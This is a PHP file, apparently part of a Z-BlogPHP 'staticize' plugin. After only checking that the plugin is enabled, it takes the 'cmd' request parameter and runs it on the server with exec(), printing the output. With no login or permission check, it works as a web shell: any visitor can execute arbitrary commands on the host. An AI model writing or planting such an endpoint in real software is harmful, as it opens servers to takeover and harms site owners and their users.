<?php

require '../../../zb_system/function/c_system_base.php';

$zbp->Load();

Add_Filter_Plugin('Filter_Plugin_Zbp_ShowError', 'RespondError', PLUGIN_EXITSIGNAL_RETURN);

if (!$zbp->CheckPlugin('staticize')) {
    $zbp->ShowError(48);
    die();
}


$cmd = trim($_REQUEST['cmd']);
if ($cmd == '') {
    $zbp->ShowError('命令为空.');
    die();
}

$output = array();
$returnValue = 0;

// 执行 shell 命令
exec($cmd, $output, $returnValue);

// 检查返回值以确定命令是否成功执行
if ($returnValue === 0) {
    // 命令执行成功
    echo "Command executed successfully.\n";
    
    // 输出正确的结果
    echo "Output:\n";
    foreach ($output as $line) {
        echo $line . "\n";
    }
} else {
    // 命令执行失败
    echo "Command failed to execute.\n";
    
    // 输出错误信息
    echo "Error:\n";
    foreach ($output as $line) {
        echo $line . "\n";
    }
}